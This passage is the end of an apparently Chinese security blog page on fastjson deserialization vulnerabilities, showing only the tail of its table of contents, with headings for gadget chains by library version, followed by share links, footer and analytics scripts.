href="#%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90-6"><span class="toc-number">11.4.</span> <span class="toc-text">调试分析</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#1-2-25-1-2-62"><span class="toc-number">12.</span> <span class="toc-text">1.2.25-1.2.62</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#JndiConverter%E9%93%BE"><span class="toc-number">12.1.</span> <span class="toc-text">JndiConverter链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A1%A5%E4%B8%81%E5%88%86%E6%9E%90-4"><span class="toc-number">12.1.1.</span> <span class="toc-text">补丁分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exp-7"><span class="toc-number">12.1.2.</span> <span class="toc-text">Exp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%99%90%E5%88%B6-7"><span class="toc-number">12.1.3.</span> <span class="toc-text">限制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90-7"><span class="toc-number">12.1.4.</span> <span class="toc-text">调试分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CocoonSlide%E9%93%BE"><span class="toc-number">12.2.</span> <span class="toc-text">CocoonSlide链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A1%A5%E4%B8%81%E5%88%86%E6%9E%90-5"><span class="toc-number">12.2.1.</span> <span class="toc-text">补丁分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exp-8"><span class="toc-number">12.2.2.</span> <span class="toc-text">Exp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%99%90%E5%88%B6-8"><span class="toc-number">12.2.3.</span> <span class="toc-text">限制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90-8"><span class="toc-number">12.2.4.</span> <span class="toc-text">调试分析</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#1-2-25-1-2-66"><span class="toc-number">13.</span> <span class="toc-text">1.2.25-1.2.66</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#shiro%E9%93%BE"><span class="toc-number">13.1.</span> <span class="toc-text">shiro链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-2"><span class="toc-number">13.1.1.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exp-9"><span class="toc-number">13.1.2.</span> <span class="toc-text">Exp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%99%90%E5%88%B6-9"><span class="toc-number">13.1.3.</span> <span class="toc-text">限制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90-9"><span class="toc-number">13.1.4.</span> <span class="toc-text">调试分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#anteros%E9%93%BE"><span class="toc-number">13.2.</span> <span class="toc-text">anteros链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-3"><span class="toc-number">13.2.1.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exp-10"><span class="toc-number">13.2.2.</span> <span class="toc-text">Exp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%99%90%E5%88%B6-10"><span class="toc-number">13.2.3.</span> <span class="toc-text">限制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90-10"><span class="toc-number">13.2.4.</span> <span class="toc-text">调试分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#IbatisSqlmap%E9%93%BE"><span class="toc-number">13.3.</span> <span class="toc-text">IbatisSqlmap链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-4"><span class="toc-number">13.3.1.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exp-11"><span class="toc-number">13.3.2.</span> <span class="toc-text">Exp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%99%90%E5%88%B6-11"><span class="toc-number">13.3.3.</span> <span class="toc-text">限制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90-11"><span class="toc-number">13.3.4.</span> <span class="toc-text">调试分析</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#1-2-25-1-2-67"><span class="toc-number">14.</span> <span class="toc-text">1.2.25-1.2.67</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#igniteJta%E9%93%BE"><span class="toc-number">14.1.</span> <span class="toc-text">igniteJta链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-5"><span class="toc-number">14.1.1.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exp-12"><span class="toc-number">14.1.2.</span> <span class="toc-text">Exp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%99%90%E5%88%B6-12"><span class="toc-number">14.1.3.</span> <span class="toc-text">限制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90-12"><span class="toc-number">14.1.4.</span> <span class="toc-text">调试分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#shiro%E9%93%BE-1"><span class="toc-number">14.1.5.</span> <span class="toc-text">shiro链</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-6"><span class="toc-number">14.1.6.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exp-13"><span class="toc-number">14.1.7.</span> <span class="toc-text">Exp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%99%90%E5%88%B6-13"><span class="toc-number">14.1.8.</span> <span class="toc-text">限制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90-13"><span class="toc-number">14.1.9.</span> <span class="toc-text">调试分析</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#1-2-25-1-2-68"><span class="toc-number">15.</span> <span class="toc-text">1.2.25-1.2.68</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-7"><span class="toc-number">15.1.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exp-14"><span class="toc-number">15.2.</span> <span class="toc-text">Exp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%99%90%E5%88%B6-14"><span class="toc-number">15.3.</span> <span class="toc-text">限制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90-14"><span class="toc-number">15.4.</span> <span class="toc-text">调试分析</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#1-2-25-1-2-83"><span class="toc-number">16.</span> <span class="toc-text">1.2.25-1.2.83</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-8"><span class="toc-number">16.1.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exp-15"><span class="toc-number">16.2.</span> <span class="toc-text">Exp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%99%90%E5%88%B6-15"><span class="toc-number">16.3.</span> <span class="toc-text">限制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90-15"><span class="toc-number">16.4.</span> <span class="toc-text">调试分析</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B0%8F%E7%BB%93"><span class="toc-number">17.</span> <span class="toc-text">小结</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">18.</span> <span class="toc-text">参考链接</span></a></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://jaspersec.top/2023/12/24/0x0C%20fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93%20TODO/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://jaspersec.top/2023/12/24/0x0C%20fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93%20TODO/&text=fastjson反序列化总结 TODO"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://jaspersec.top/2023/12/24/0x0C%20fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93%20TODO/&title=fastjson反序列化总结 TODO"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://jaspersec.top/2023/12/24/0x0C%20fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93%20TODO/&is_video=false&description=fastjson反序列化总结 TODO"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=fastjson反序列化总结 TODO&body=Check out this article: https://jaspersec.top/2023/12/24/0x0C%20fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93%20TODO/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://jaspersec.top/2023/12/24/0x0C%20fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93%20TODO/&title=fastjson反序列化总结 TODO"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://jaspersec.top/2023/12/24/0x0C%20fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93%20TODO/&title=fastjson反序列化总结 TODO"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://jaspersec.top/2023/12/24/0x0C%20fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93%20TODO/&title=fastjson反序列化总结 TODO"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://jaspersec.top/2023/12/24/0x0C%20fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93%20TODO/&title=fastjson反序列化总结 TODO"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://jaspersec.top/2023/12/24/0x0C%20fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93%20TODO/&name=fastjson反序列化总结 TODO&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://jaspersec.top/2023/12/24/0x0C%20fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93%20TODO/&t=fastjson反序列化总结 TODO"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2023
    Jasper_sec
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/sketchpl4ne">Projects</a></li><!--
     --><!--
       --><li><a href="/links/">links</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     -->
      </ul>
      <ul>
        <script async src="https://busuanzi.icodeq.com/busuanzi.pure.mini.js"></script>
        本文总阅读量 <span id="busuanzi_value_page_pv"></span> 次
        本站总访问量 <span id="busuanzi_value_site_pv"></span> 次
        本站总访客数 <span id="busuanzi_value_site_uv"></span> 人
      </ul>
    </nav>
  </div>

</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

  <script type="text/javascript">
        var _hmt = _hmt || [];
        (function() {
          var hm = document.createElement("script");
          hm.src = "https://hm.baidu.com/hm.js?21e6754c7f372c2de41518ffb4f72c33";
          var s = document.getElementsByTagName("script")[0];
          s.parentNode.insertBefore(hm, s);
        })();
        </script>

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
